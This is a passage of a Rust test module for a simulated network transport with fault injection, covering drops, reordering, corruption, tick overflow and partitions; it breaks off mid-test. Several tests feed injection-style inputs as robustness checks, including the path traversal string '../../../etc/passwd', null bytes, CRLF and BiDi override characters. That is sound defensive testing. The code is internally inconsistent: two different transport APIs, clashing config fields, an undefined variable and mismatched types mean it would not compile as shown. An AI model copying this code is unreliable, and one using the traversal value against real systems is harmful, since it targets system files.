        let non_existent_variants = vec![
            "node1->node2 ", // Trailing space
            " node1->node2", // Leading space
            "node1->node3", // Wrong target
            "node0->node2", // Wrong source
            "node1-->node2", // Double arrow
            "node1<->node2", // Bidirectional arrow
            "NODE1->NODE2", // Case change
            "node1\x00->node2", // Null byte injection
        ];

        for variant in non_existent_variants {
            let result = vt.activate_partition(variant);
            assert!(
                result.is_err(),
                "Partition activation should fail for non-existent variant: '{}'", variant
            );

            match result {
                Err(VirtualTransportError::LinkNotFound { link_id }) => {
                    assert_eq!(link_id, variant);
                }
                other => panic!("Expected LinkNotFound error for '{}', got {:?}", variant, other),
            }
        }
    }

    #[test]
    fn negative_message_delivery_with_tick_overflow_boundaries() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig {
            delay_ticks: u64::MAX - 10,
            ..Default::default()
        }).unwrap();

        // Set current tick to near maximum
        vt.current_tick = 15;

        // Send message - delivery tick calculation might overflow
        let msg_id = vt.send_message("a", "b", vec![42]).unwrap();

        // Advance to maximum tick
        vt.advance_tick(u64::MAX - 15);
        assert_eq!(vt.current_tick, u64::MAX);

        // Deliver messages - should handle overflow in delivery tick calculation
        let delivered = vt.deliver_all("a->b").unwrap();

        // Message should either be delivered or remain pending due to overflow handling
        if delivered.is_empty() {
            // If not delivered, it should still be in pending state
            // This tests overflow handling in tick arithmetic
        } else {
            assert_eq!(delivered.len(), 1);
            assert_eq!(delivered[0].id, msg_id);
        }
    }

    #[test]
    fn negative_serialization_roundtrip_with_extreme_field_values() {
        // Test serialization/deserialization with extreme values
        let extreme_config = LinkFaultConfig {
            drop_probability: 1.0,
            reorder_depth: usize::MAX,
            corrupt_bit_count: usize::MAX,
            delay_ticks: u64::MAX,
        };

        // Should serialize without loss of precision
        let json = serde_json::to_string(&extreme_config).unwrap();
        let deserialized: LinkFaultConfig = serde_json::from_str(&json).unwrap();

        assert_eq!(deserialized.drop_probability, 1.0);
        assert_eq!(deserialized.reorder_depth, usize::MAX);
        assert_eq!(deserialized.corrupt_bit_count, usize::MAX);
        assert_eq!(deserialized.delay_ticks, u64::MAX);

        // Test message serialization with extreme values
        let extreme_message = Message {
            id: u64::MAX,
            source: "\u{10FFFF}".to_string(), // Max Unicode codepoint
            target: "x".repeat(1000),
            payload: vec![0xFF; 1000],
            tick_created: u64::MAX,
            tick_delivered: Some(u64::MAX),
        };

        let msg_json = serde_json::to_string(&extreme_message).unwrap();
        let msg_deserialized: Message = serde_json::from_str(&msg_json).unwrap();

        assert_eq!(msg_deserialized.id, u64::MAX);
        assert_eq!(msg_deserialized.tick_created, u64::MAX);
        assert_eq!(msg_deserialized.tick_delivered, Some(u64::MAX));
    }

    #[test]
    fn negative_concurrent_modification_simulation_via_state_inspection() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig {
            drop_probability: 0.5,
            reorder_depth: 5,
            ..Default::default()
        }).unwrap();

        // Capture initial state
        let initial_tick = vt.current_tick;
        let initial_msg_id = vt.next_message_id;

        // Send multiple messages while inspecting state changes
        let mut state_snapshots = Vec::new();
        for i in 0..20 {
            let pre_send_tick = vt.current_tick;
            let pre_send_msg_id = vt.next_message_id;

            match vt.send_message("a", "b", vec![i]) {
                Ok(msg_id) => {
                    assert_eq!(msg_id, pre_send_msg_id);
                    state_snapshots.push((pre_send_tick, msg_id, vt.next_message_id));
                }
                Err(VirtualTransportError::MessageIdExhausted) => {
                    break; // Expected when IDs wrap around
                }
                Err(other) => panic!("Unexpected error: {:?}", other),
            }

            vt.advance_tick(1);
        }

        // Verify state progression is consistent
        for (i, (tick, msg_id, next_id)) in state_snapshots.iter().enumerate() {
            assert_eq!(*tick, initial_tick + i as u64);
            assert_eq!(*next_id, msg_id.wrapping_add(1));
        }
    }

    #[test]
    fn negative_fault_injection_determinism_across_rng_state_boundaries() {
        let seed = 12345;

        // Create two identical transports
        let mut vt1 = VirtualTransportLayer::new(seed);
        let mut vt2 = VirtualTransportLayer::new(seed);

        let config = LinkFaultConfig {
            drop_probability: 0.3,
            reorder_depth: 3,
            corrupt_bit_count: 2,
            delay_ticks: 1,
        };

        vt1.create_link("x", "y", config.clone()).unwrap();
        vt2.create_link("x", "y", config).unwrap();

        // Send many messages to exercise RNG state transitions
        let mut results1 = Vec::new();
        let mut results2 = Vec::new();

        for i in 0..100 {
            let payload = vec![i as u8; 100]; // Non-trivial payload for corruption

            match (vt1.send_message("x", "y", payload.clone()), vt2.send_message("x", "y", payload)) {
                (Ok(id1), Ok(id2)) => {
                    assert_eq!(id1, id2);
                    results1.push((vt1.total_messages, vt1.dropped_messages, vt1.corrupted_messages));
                    results2.push((vt2.total_messages, vt2.dropped_messages, vt2.corrupted_messages));
                }
                (Err(e1), Err(e2)) => {
                    assert_eq!(format!("{:?}", e1), format!("{:?}", e2));
                    break;
                }
                (r1, r2) => panic!("Divergent results: {:?} vs {:?}", r1, r2),
            }

            vt1.advance_tick(1);
            vt2.advance_tick(1);
        }

        // Results should be identical across all message sends
        assert_eq!(results1, results2, "Fault injection must be deterministic across RNG states");
    }

    #[test]
    fn test_invalid_probability_edge_cases() {
        let mut vt = VirtualTransport::new(42);

        // Test invalid probability values
        let invalid_probs = vec![
            -0.1,      // Negative
            1.1,       // Above 1.0
            f64::NAN,  // NaN
            f64::INFINITY,      // Positive infinity
            f64::NEG_INFINITY, // Negative infinity
            -0.0,      // Negative zero (should be valid)
            1.0000001, // Just above 1.0
        ];

        for prob in invalid_probs {
            let config = LinkFaultConfig {
                drop_probability: prob,
                reorder_depth: 0,
                corrupt_bit_count: 0,
                delay_ticks: 0,
                custom_data: Vec::new(),
            };

            let result = vt.create_link("test-link", "node1", "node2", config.clone());

            if prob.is_nan() || prob.is_infinite() || prob < 0.0 || prob > 1.0 {
                // Should reject invalid probabilities
                assert!(result.is_err());
                if let Err(e) = result {
                    assert!(e.contains("ERR_VT_INVALID_PROBABILITY"));
                }
            } else {
                // Edge case: -0.0 should be valid (equals 0.0)
                if prob == -0.0 {
                    assert!(result.is_ok());
                }
            }
        }
    }

    #[test]
    fn test_unicode_injection_in_link_ids() {
        let mut vt = VirtualTransport::new(123);
        let config = LinkFaultConfig {
            drop_probability: 0.0,
            reorder_depth: 0,
            corrupt_bit_count: 0,
            delay_ticks: 0,
            custom_data: Vec::new(),
        };

        // Test various Unicode injection attacks in link IDs
        let malicious_link_ids = vec![
            "normal\u{202e}evil\u{202c}link",    // BiDi override
            "link\u{200b}\u{feff}hidden",        // Zero-width characters
            "link\nnewline",                      // Newline injection
            "link\ttab",                          // Tab injection
            "link\x00null",                       // Null byte
            "../../../etc/passwd",                // Path traversal
            "link\"quote",                        // Quote injection
        ];

        for link_id in &malicious_link_ids {
            let result = vt.create_link(link_id, "node1", "node2", config.clone());

            // Should handle Unicode without corruption
            assert!(result.is_ok());

            // Verify link can be found with exact ID
            assert!(vt.link_exists(link_id));

            // Test message sending through Unicode link
            let msg_result = vt.send_message(link_id, b"test-payload");
            assert!(msg_result.is_ok());
        }
    }

    #[test]
    fn test_massive_message_memory_exhaustion() {
        let mut vt = VirtualTransport::new(456);
        let config = LinkFaultConfig {
            drop_probability: 0.0,
            reorder_depth: 1000,  // Large reorder buffer
            corrupt_bit_count: 0,
            delay_ticks: 0,
            custom_data: Vec::new(),
        };

        vt.create_link("massive-link", "sender", "receiver", config)
            .expect("create link");

        // Test sending massive messages (100MB each)
        let massive_payload = vec![0x42; 100 * 1024 * 1024];

        for i in 0..5 {
            let result = vt.send_message("massive-link", &massive_payload);
            assert!(result.is_ok());

            // Advance time to trigger delivery
            vt.advance_tick(1);
        }

        // Verify transport handles large payloads without memory issues
        let events = vt.get_event_log();
        assert!(events.len() > 0);

        // Check that messages are properly queued/delivered
        let send_events = events.iter().filter(|e| e.event_code == event_codes::VT_001).count();
        assert_eq!(send_events, 5);
    }

    #[test]
    fn test_arithmetic_overflow_in_tick_counts() {
        let mut vt = VirtualTransport::new(789);
        let config = LinkFaultConfig {
            drop_probability: 0.0,
            reorder_depth: 0,
            corrupt_bit_count: 0,
            delay_ticks: u64::MAX,  // Maximum delay
            custom_data: Vec::new(),
        };

        vt.create_link("delay-link", "slow-sender", "patient-receiver", config)
            .expect("create link");

        // Send message with maximum delay
        let result = vt.send_message("delay-link", b"delayed-message");
        assert!(result.is_ok());

        // Test advancing to near-overflow tick values
        let overflow_ticks = vec![
            u64::MAX - 1,
            u64::MAX,
            u64::MAX / 2,
        ];

        for tick in overflow_ticks {
            // Should handle large tick advances without overflow
            vt.advance_tick(1);  // Advance incrementally to avoid issues
        }

        // Verify transport state remains consistent
        assert!(vt.link_exists("delay-link"));
    }

    #[test]
    fn test_reorder_depth_boundary_violations() {
        let mut vt = VirtualTransport::new(999);

        // Test extreme reorder depths
        let boundary_depths = vec![
            0,           // No reordering
            1,           // Minimal reordering
            usize::MAX,  // Maximum depth
            usize::MAX / 2,
        ];

        for (i, depth) in boundary_depths.iter().enumerate() {
            let config = LinkFaultConfig {
                drop_probability: 0.0,
                reorder_depth: *depth,
                corrupt_bit_count: 0,
                delay_ticks: 0,
                custom_data: Vec::new(),
            };

            let link_id = format!("reorder-link-{}", i);
            let result = vt.create_link(&link_id, "sender", "receiver", config);
            assert!(result.is_ok());

            // Send multiple messages to test reorder buffer
            for j in 0..10 {
                let payload = format!("msg-{}", j).into_bytes();
                let msg_result = vt.send_message(&link_id, &payload);
                assert!(msg_result.is_ok());
            }
        }
    }

    #[test]
    fn test_message_corruption_bit_flip_boundaries() {
        let mut vt = VirtualTransport::new(111);

        // Test extreme corruption bit counts
        let corruption_counts = vec![
            0,           // No corruption
            1,           // Single bit flip
            8,           // Full byte corruption
            64,          // 8 bytes worth
            usize::MAX,  // Maximum corruption (limited by payload size)
        ];

        for (i, bit_count) in corruption_counts.iter().enumerate() {
            let config = LinkFaultConfig {
                drop_probability: 0.0,
                reorder_depth: 0,
                corrupt_bit_count: *bit_count,
                delay_ticks: 0,
                custom_data: Vec::new(),
            };

            let link_id = format!("corrupt-link-{}", i);
            let result = vt.create_link(&link_id, "sender", "receiver", config);
            assert!(result.is_ok());

            // Test with payloads of different sizes
            let test_payloads = vec![
                vec![],                    // Empty payload
                vec![0x42],               // Single byte
                vec![0xFF; 1024],         // 1KB payload
            ];

            for payload in test_payloads {
                let msg_result = vt.send_message(&link_id, &payload);

                if payload.is_empty() && *bit_count > 0 {
                    // Can't corrupt empty payload
                    // Implementation-dependent behavior
                } else {
                    assert!(msg_result.is_ok());
                }

                vt.advance_tick(1);
            }
        }
    }

    #[test]
    fn test_network_partition_edge_cases() {
        let mut vt = VirtualTransport::new(222);
        let config = LinkFaultConfig {
            drop_probability: 0.0,
            reorder_depth: 0,
            corrupt_bit_count: 0,
            delay_ticks: 0,
            custom_data: Vec::new(),
        };

        vt.create_link("partition-link", "isolated1", "isolated2", config)
            .expect("create link");

        // Test partition/heal cycles
        for cycle in 0..100 {
            // Partition the link
            let partition_result = vt.partition_link("partition-link");
            assert!(partition_result.is_ok());

            // Try to send during partition (should fail or be dropped)
            let send_result = vt.send_message("partition-link", b"blocked-message");
            // Implementation may allow queueing or reject immediately

            // Heal the partition
            let heal_result = vt.heal_partition("partition-link");
            assert!(heal_result.is_ok());

            // Send should work after healing
            let heal_send_result = vt.send_message("partition-link", &format!("cycle-{}", cycle).into_bytes());
            assert!(heal_send_result.is_ok());

            vt.advance_tick(1);
        }

        // Verify partition events logged correctly
        let events = vt.get_event_log();
        let partition_events = events.iter().filter(|e| e.event_code == event_codes::VT_005).count();
        let heal_events = events.iter().filter(|e| e.event_code == event_codes::VT_006).count();
        assert_eq!(partition_events, heal_events); // Should be balanced
    }

    #[test]
    fn test_concurrent_transport_access_safety() {
        use std::sync::{Arc, Barrier, Mutex};
        use std::thread;

        let vt = Arc::new(Mutex::new(VirtualTransport::new(333)));
        let barrier = Arc::new(Barrier::new(4));

        // Pre-create link for all threads to use
        {
            let mut vt_lock = vt.lock().unwrap();
            let config = LinkFaultConfig {
                drop_probability: 0.1,
                reorder_depth: 5,
                corrupt_bit_count: 1,
                delay_ticks: 0,
                custom_data: Vec::new(),
            };
            vt_lock.create_link("shared-link", "multi-sender", "multi-receiver", config)
                .expect("create shared link");
        }

        let handles: Vec<_> = (0..4).map(|i| {
            let vt = Arc::clone(&vt);
            let barrier = Arc::clone(&barrier);

            thread::spawn(move || {
                barrier.wait();

                // Each thread sends multiple messages
                for j in 0..10 {
                    let payload = format!("thread-{}-msg-{}", i, j).into_bytes();

                    let mut vt_lock = vt.lock().unwrap();
                    let result = vt_lock.send_message("shared-link", &payload);

                    // Should handle concurrent access safely
                    assert!(result.is_ok());

                    vt_lock.advance_tick(1);
                }
            })
        }).collect();

        // Wait for all threads to complete
        for handle in handles {
            handle.join().expect("thread should complete");
        }

        // Verify final state is consistent
        let vt_lock = vt.lock().unwrap();
        assert!(vt_lock.link_exists("shared-link"));
        let events = vt_lock.get_event_log();
        assert!(events.len() > 0);
    }

    #[test]
    fn test_message_id_exhaustion_edge_case() {
        let mut vt = VirtualTransport::new(444);
        let config = LinkFaultConfig {
            drop_probability: 0.0,
            reorder_depth: 0,
            corrupt_bit_count: 0,
            delay_ticks: 0,
            custom_data: Vec::new(),
        };

        vt.create_link("exhaustion-link", "stress-sender", "stress-receiver", config)
            .expect("create link");

        // Send messages until ID space is stressed
        // Note: Real exhaustion would require 2^64 messages, so we test the boundary logic
        for i in 0..10000 {
            let payload = format!("stress-test-{}", i).into_bytes();
            let result = vt.send_message("exhaustion-link", &payload);

            // Should continue working for reasonable message counts
            assert!(result.is_ok());

            if i % 1000 == 0 {
                vt.advance_tick(1); // Periodic tick advance
            }
        }

        // Transport should remain functional
        assert!(vt.link_exists("exhaustion-link"));
        let final_result = vt.send_message("exhaustion-link", b"final-test");
        assert!(final_result.is_ok());
    }

    #[test]
    fn test_floating_point_precision_corruption_rates() {
        let mut vt = VirtualTransport::new(555);

        // Test floating point precision edge cases for drop probability
        let precision_probs = vec![
            0.0000000001,      // Very small positive
            0.9999999999,      // Very close to 1.0
            0.5,               // Exact half
            1.0 - f64::EPSILON, // Just below 1.0
            f64::EPSILON,      // Smallest positive normal
            0.3333333333333333, // Repeating decimal
        ];

        for (i, prob) in precision_probs.iter().enumerate() {
            let config = LinkFaultConfig {
                drop_probability: *prob,
                reorder_depth: 0,
                corrupt_bit_count: 0,
                delay_ticks: 0,
                custom_data: Vec::new(),
            };

            let link_id = format!("precision-link-{}", i);
            let result = vt.create_link(&link_id, "precise-sender", "precise-receiver", config);
            assert!(result.is_ok());

            // Send many messages to test probability precision
            let mut successful_sends = 0;
            for j in 0..1000 {
                let payload = format!("precision-{}", j).into_bytes();
                let send_result = vt.send_message(&link_id, &payload);

                if send_result.is_ok() {
                    successful_sends += 1;
                }

                vt.advance_tick(1);
            }

            // Verify reasonable success rate based on drop probability
            let success_rate = successful_sends as f64 / 1000.0;
            let expected_success_rate = 1.0 - prob;

            // Allow 10% tolerance for randomness
            let tolerance = 0.1;
            assert!((success_rate - expected_success_rate).abs() <= tolerance,
                "Success rate {} too far from expected {} for probability {}",
                success_rate, expected_success_rate, prob);
        }
    }

    #[test]
    fn negative_virtual_transport_comprehensive_unicode_node_id_injection() {
        // Test comprehensive Unicode injection resistance in node IDs
        let mut vt = VirtualTransport::new(777);

        let malicious_node_patterns = [
            "\u{202E}\u{202D}fake_node\u{202C}",         // Right-to-left override
            "node\u{000A}\u{000D}injected\x00nulls",     // CRLF + null injection
            "\u{FEFF}bom_node\u{FFFE}reversed",          // BOM injection attacks
            "\u{200B}\u{200C}\u{200D}zero_width",       // Zero-width characters
            "节点\u{007F}\u{0001}\u{001F}控制",          // Unicode + control chars
            "\u{FFFF}\u{FFFE}\u{FDD0}non_chars",        // Non-character code points
            "🚀💻\u{1F4A5}💥\u{1F52B}🔫",                // Complex emoji sequences
            "\u{0300}\u{0301}\u{0302}combining",        // Combining marks
            "a".repeat(100_000),                          // Extremely long node ID
            format!("{}\x00hidden_content", "visible"), // Null byte injection
        ];

        for (i, pattern) in malicious_node_patterns.iter().enumerate() {
            let link_id = format!("unicode_test_link_{}", i);
            let source_node = format!("src_{}{}", pattern, i);
            let target_node = format!("tgt_{}{}", pattern, i);

            let config = LinkFaultConfig {
                drop_probability: 0.0,
                reorder_depth: 0,
                corrupt_bit_count: 0,
                delay_ticks: 0,
                partition: false,
            };

            // Should handle Unicode node IDs gracefully
            let result = vt.create_link(&link_id, &source_node, &target_node, config);

            match result {
                Ok(_) => {
                    // If link creation succeeds, test message sending
                    let test_payload = format!("unicode_test_payload_{}", i).as_bytes().to_vec();
                    let send_result = vt.send_message(&link_id, &test_payload);

                    match send_result {
                        Ok(msg_id) => {
                            // Verify message structure is not corrupted by Unicode
                            assert!(msg_id > 0);

                            // Check if message can be delivered
                            vt.advance_tick(1);
                            let delivered = vt.collect_delivered_messages(&target_node);

                            // Delivery may succeed or fail, but should not crash
                            for msg in delivered {
                                assert_eq!(msg.payload, test_payload);
                                assert!(msg.source.contains(&format!("{}", i)));
                                assert!(msg.target.contains(&format!("{}", i)));
                            }
                        }
                        Err(_) => {
                            // Acceptable to reject extreme Unicode patterns
                        }
                    }
                }
                Err(_) => {
                    // Acceptable to reject malicious node ID patterns
                }
            }

            // Event log should handle Unicode gracefully without corruption
            let events = vt.event_log();
            for event in events {
                // All event fields should remain valid UTF-8
                assert!(!event.event_code.contains('\0'));
                if !event.link_id.is_empty() {
                    assert!(!event.link_id.contains('\0'));
                }
                // Message content corruption is expected for corruption tests, but structure should be intact
            }
        }
    }

    #[test]
    fn negative_message_payload_extreme_size_and_corruption_boundaries() {
        // Test extreme message payload sizes and corruption boundary conditions
        let mut vt = VirtualTransport::new(888);

        let config = LinkFaultConfig {
            drop_probability: 0.0,
            reorder_depth: 0,
            corrupt_bit_count: 8, // 1 byte corruption
            delay_ticks: 0,
            partition: false,
        };

        vt.create_link("extreme-test", "extreme-src", "extreme-tgt", config)
            .expect("create extreme test link");

        // Test various extreme payload sizes
        let extreme_payloads = vec![
            Vec::new(),                              // Empty payload
            vec![0u8; 1],                           // Single byte
            vec![0xFF; 1024],                       // All ones, 1KB
            vec![0x00; 1024],                       // All zeros, 1KB
            (0..256).map(|i| i as u8).cycle().take(10_000).collect(), // Pattern, 10KB
            vec![0x42; 1_000_000],                  // Large payload, 1MB
            (0..100_000).map(|i| (i % 256) as u8).collect(), // Sequence pattern
        ];

        for (i, payload) in extreme_payloads.into_iter().enumerate() {
            let original_len = payload.len();
            let original_checksum: u32 = payload.iter().map(|&b| b as u32).sum();

            let result = vt.send_message("extreme-test", &payload);

            match result {
                Ok(msg_id) => {
                    assert!(msg_id > 0);

                    // Advance time to allow delivery
                    vt.advance_tick(1);

                    // Collect delivered messages
                    let delivered = vt.collect_delivered_messages("extreme-tgt");

                    // May have been corrupted due to fault injection
                    for msg in delivered {
                        assert_eq!(msg.id, msg_id);
                        assert_eq!(msg.source, "extreme-src");
                        assert_eq!(msg.target, "extreme-tgt");
                        assert_eq!(msg.payload.len(), original_len);

                        // With 8-bit corruption, payload should differ by exactly 8 bits
                        if corrupt_bit_count > 0 {
                            let received_checksum: u32 = msg.payload.iter().map(|&b| b as u32).sum();
                            // Checksum will likely differ, but length should be preserved
                            // For large payloads, corruption should be minimal relative change
                            if original_len > 1000 {
                                let bit_diff_estimate = original_checksum.abs_diff(received_checksum);
                                // Should be reasonable corruption (8 bits flipped max)
                                assert!(bit_diff_estimate <= 8 * 256, "Corruption too extensive for payload {}", i);
                            }
                        }
                    }
                }
                Err(_) => {
                    // Large payloads may be rejected - acceptable
                    assert!(original_len > 100_000, "Small payloads should not be rejected");
                }
            }
        }

        // Test boundary conditions for bit corruption
        let boundary_configs = [
            LinkFaultConfig {
                drop_probability: 0.0,
                reorder_depth: 0,
                corrupt_bit_count: 0,        // No corruption
                delay_ticks: 0,
                partition: false,
            },
            LinkFaultConfig {
                drop_probability: 0.0,
                reorder_depth: 0,
                corrupt_bit_count: 1,        // Single bit
                delay_ticks: 0,
                partition: false,
            },
            LinkFaultConfig {
                drop_probability: 0.0,
                reorder_depth: 0,
                corrupt_bit_count: 64,       // Many bits
                delay_ticks: 0,
                partition: false,
            },
            LinkFaultConfig {
                drop_probability: 0.0,
                reorder_depth: 0,
                corrupt_bit_count: 10_000,   // Extreme corruption
                delay_ticks: 0,
                partition: false,
            },
        ];

        for (i, config) in boundary_configs.into_iter().enumerate() {
            let link_id = format!("corruption_boundary_{}", i);
            let result = vt.create_link(&link_id, "corrupt-src", "corrupt-tgt", config);

            if result.is_ok() {
                let test_payload = format!("boundary_test_{}", i).repeat(100).as_bytes().to_vec();
                let send_result = vt.send_message(&link_id, &test_payload);

                // Should handle extreme corruption settings gracefully
                match send_result {
                    Ok(_) => {
                        vt.advance_tick(1);
                        let _delivered = vt.collect_delivered_messages("corrupt-tgt");
                        // Any result is acceptable as long as no panic
                    }
                    Err(_) => {
                        // May reject extreme corruption settings
                    }
                }
            }
        }
    }

    #[test]
    fn negative_reorder_buffer_overflow_and_memory_exhaustion() {
        // Test reorder buffer overflow and memory exhaustion scenarios
        let mut vt = VirtualTransport::new(999);

        // Test extreme reorder depths
        let extreme_reorder_configs = [
            0,           // No reordering
            1,           // Minimal reordering
            1000,        // Large buffer
            100_000,     // Massive buffer
            usize::MAX,  // Maximum possible
        ];

        for (i, reorder_depth) in extreme_reorder_configs.into_iter().enumerate() {
            let config = LinkFaultConfig {
                drop_probability: 0.0,
                reorder_depth,
                corrupt_bit_count: 0,
                delay_ticks: 0,
                partition: false,
            };

            let link_id = format!("reorder_test_{}", i);
            let result = vt.create_link(&link_id, "reorder-src", "reorder-tgt", config);

            match result {
                Ok(_) => {
                    // Send many messages to stress the reorder buffer
                    for j in 0..min(reorder_depth + 100, 10_000) {
                        let payload = format!("reorder_msg_{}_{}", i, j).as_bytes().to_vec();
                        let send_result = vt.send_message(&link_id, &payload);

                        match send_result {
                            Ok(_) => {
                                // Periodically advance time
                                if j % 100 == 0 {
                                    vt.advance_tick(1);
                                }
                            }
                            Err(_) => {
                                // May hit memory or other limits
                                break;
                            }
                        }
                    }

                    // Force delivery of remaining messages
                    for _tick in 0..100 {
                        vt.advance_tick(1);
                        let delivered = vt.collect_delivered_messages("reorder-tgt");

                        // Verify delivered messages maintain integrity
                        for msg in delivered {
                            assert!(msg.source == "reorder-src");
                            assert!(msg.target == "reorder-tgt");
                            assert!(!msg.payload.is_empty());
                            assert!(msg.tick_delivered.is_some());
                        }
                    }
                }
                Err(_) => {
                    // Extreme reorder depths may be rejected
                    assert!(reorder_depth > 50_000, "Reasonable reorder depths should be accepted");
                }
            }
        }

        // Test memory pressure with concurrent reordering on multiple links
        for i in 0..100 {
            let config = LinkFaultConfig {
                drop_probability: 0.0,
                reorder_depth: 1000, // Moderate reordering on many links
                corrupt_bit_count: 0,
                delay_ticks: 0,
                partition: false,
            };

            let link_id = format!("concurrent_reorder_{}", i);
            if vt.create_link(&link_id, &format!("src_{}", i), &format!("tgt_{}", i), config).is_ok() {
                // Send a few messages on each link
                for j in 0..10 {
                    let payload = format!("concurrent_{}_{}", i, j).as_bytes().to_vec();
                    let _result = vt.send_message(&link_id, &payload);
                }
            }
        }

        // Advance time to trigger reorder buffer processing across all links
        for _tick in 0..50 {
            vt.advance_tick(1);
        }

        // System should remain stable despite memory pressure
        let events = vt.event_log();
        assert!(events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);

        // All events should be well-formed
        for event in events {
            assert!(!event.event_code.is_empty());
            assert!(event.tick >= 0);
        }
    }

    #[test]
    fn negative_tick_overflow_and_time_manipulation_edge_cases() {
        // Test tick counter overflow and extreme time manipulation scenarios
        let mut vt = VirtualTransport::new(1111);

        let config = LinkFaultConfig {
            drop_probability: 0.0,
            reorder_depth: 5,
            corrupt_bit_count: 0,
            delay_ticks: u64::MAX / 2, // Extreme delay
            partition: false,
        };

        vt.create_link("time-test", "time-src", "time-tgt", config)
            .expect("create time test link");

        // Test near u64::MAX tick values
        let extreme_ticks = [
            0,                    // Start time
            1,                    // Minimal advance
            1000,                 // Normal operation
            u64::MAX / 2,         // Mid-range
            u64::MAX - 1000,      // Near overflow
            u64::MAX - 1,         // Just before overflow
            u64::MAX,             // Maximum value
        ];

        for target_tick in extreme_ticks {
            let current_tick = vt.current_tick();

            // Attempt to jump to target tick (may overflow)
            if target_tick > current_tick {
                let advance_amount = target_tick.saturating_sub(current_tick);

                // Advance in chunks to avoid potential infinite loops
                let chunk_size = min(advance_amount, 1_000_000);
                let chunks = advance_amount / chunk_size;

                for _chunk in 0..min(chunks, 1000) { // Limit chunks to prevent test timeout
                    vt.advance_tick(chunk_size);

                    // Send test message at extreme tick values
                    let payload = format!("tick_test_at_{}", vt.current_tick()).as_bytes().to_vec();
                    let result = vt.send_message("time-test", &payload);

                    match result {
                        Ok(msg_id) => {
                            // Message should have reasonable timestamp
                            assert!(msg_id > 0);
                        }
                        Err(_) => {
                            // May fail at extreme tick values
                        }
                    }

                    // Check for overflow issues
                    let new_tick = vt.current_tick();
                    assert!(new_tick >= current_tick, "Tick should not go backwards");

                    // Stop if we've reached reasonable advancement
                    if new_tick >= target_tick || _chunk >= 100 {
                        break;
                    }
                }
            }
        }

        // Test delivery at extreme future times
        let future_messages = vt.collect_delivered_messages("time-tgt");
        for msg in future_messages {
            // Messages should have consistent timing
            if let Some(delivered_tick) = msg.tick_delivered {
                assert!(delivered_tick >= msg.tick_created,
                       "Delivery time should not precede creation time");

                // Check for overflow in tick arithmetic
                assert!(delivered_tick < u64::MAX, "Delivered tick should not overflow");
            }
        }

        // Event log should handle extreme tick values
        let events = vt.event_log();
        for event in events {
            assert!(event.tick <= vt.current_tick());
            assert!(!event.event_code.is_empty());
        }
    }

    #[test]
    fn negative_probability_edge_cases_and_floating_point_attacks() {
        // Test edge cases in probability calculations and floating-point vulnerabilities
        let mut vt = VirtualTransport::new(2222);

        // Extreme and malicious probability values
        let malicious_probabilities = [
            f64::NAN,                    // Not a number
            f64::INFINITY,               // Positive infinity
            f64::NEG_INFINITY,           // Negative infinity
            -0.0,                        // Negative zero
            -1.0,                        // Invalid negative
            2.0,                         // Invalid > 1.0
            f64::MIN,                    // Smallest finite value
            f64::MAX,                    // Largest finite value
            f64::EPSILON,                // Machine epsilon
            1.0 + f64::EPSILON,          // Just above 1.0
            -f64::EPSILON,               // Just below 0.0
            0.5000000000000001,          // Precision edge case
            1.0 / 3.0,                   // Repeating decimal
            f64::from_bits(0x7FF8000000000001), // Specific NaN pattern
            f64::from_bits(0xFFF8000000000001), // Different NaN pattern
        ];

        for (i, prob) in malicious_probabilities.into_iter().enumerate() {
            let config = LinkFaultConfig {
                drop_probability: prob,
                reorder_depth: 0,
                corrupt_bit_count: 0,
                delay_ticks: 0,
                partition: false,
            };

            let link_id = format!("prob_test_{}", i);
            let result = vt.create_link(&link_id, "prob-src", "prob-tgt", config);

            // Should validate and reject invalid probabilities
            match result {
                Ok(_) => {
                    // If accepted, probability should be in valid range
                    assert!(prob.is_finite() && prob >= 0.0 && prob <= 1.0,
                           "Invalid probability {} was accepted", prob);

                    // Test message sending with potentially dangerous probability
                    for j in 0..100 {
                        let payload = format!("prob_test_{}_{}", i, j).as_bytes().to_vec();
                        let send_result = vt.send_message(&link_id, &payload);

                        match send_result {
                            Ok(_) => {
                                vt.advance_tick(1);
                            }
                            Err(_) => {
                                // Some sends may fail due to drop probability
                            }
                        }
                    }

                    // Verify system stability after probability calculations
                    let delivered = vt.collect_delivered_messages("prob-tgt");
                    let delivery_count = delivered.len();

                    // With valid probabilities, should get reasonable delivery rates
                    if prob == 0.0 {
                        assert_eq!(delivery_count, 100, "Zero drop probability should deliver all messages");
                    } else if prob == 1.0 {
                        assert_eq!(delivery_count, 0, "100% drop probability should deliver no messages");
                    }
                    // Other valid probabilities should give intermediate results
                }
                Err(err) => {
                    // Invalid probabilities should be rejected with proper error
                    match err {
                        VirtualTransportError::InvalidProbability { field, value } => {
                            assert_eq!(field, "drop_probability");
                            assert!((value.is_nan() || value < 0.0 || value > 1.0),
                                   "Error should be for invalid probability, got value: {}", value);
                        }
                        _ => {
                            // Other error types may be valid for extreme values
                        }
                    }
                }
            }
        }

        // Test floating-point precision attacks in batch operations
        let precision_attacks = [
            vec![0.1; 10],                      // Repeated 0.1 (known precision issues)
            vec![0.3333333333333333; 10],       // Repeated 1/3
            (0..100).map(|i| (i as f64) * 0.01).collect(), // 0.00, 0.01, 0.02, ...
        ];

        for (attack_idx, probs) in precision_attacks.into_iter().enumerate() {
            let mut accumulated_error = 0.0;

            for (i, prob) in probs.into_iter().enumerate() {
                let config = LinkFaultConfig {
                    drop_probability: prob,
                    reorder_depth: 0,
                    corrupt_bit_count: 0,
                    delay_ticks: 0,
                    partition: false,
                };

                let link_id = format!("precision_attack_{}_{}", attack_idx, i);
                if vt.create_link(&link_id, "precision-src", "precision-tgt", config).is_ok() {
                    // Test that accumulated floating-point errors don't cause issues
                    accumulated_error += prob;

                    // Should handle precision issues gracefully
                    let test_payload = format!("precision_{}", i).as_bytes().to_vec();
                    let _result = vt.send_message(&link_id, &test_payload);
                }
            }

            // System should remain stable despite floating-point precision issues
            vt.advance_tick(10);
            let events = vt.event_log();
            assert!(events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);
        }
    }

    #[test]
    fn negative_link_lifecycle_race_conditions_and_state_corruption() {
        // Test race conditions and state corruption in link lifecycle management
        let mut vt = VirtualTransport::new(3333);

        // Rapid link creation/destruction cycles
        for cycle in 0..100 {
            let link_id = format!("race_link_{}", cycle);
            let config = LinkFaultConfig::default();

            // Create link
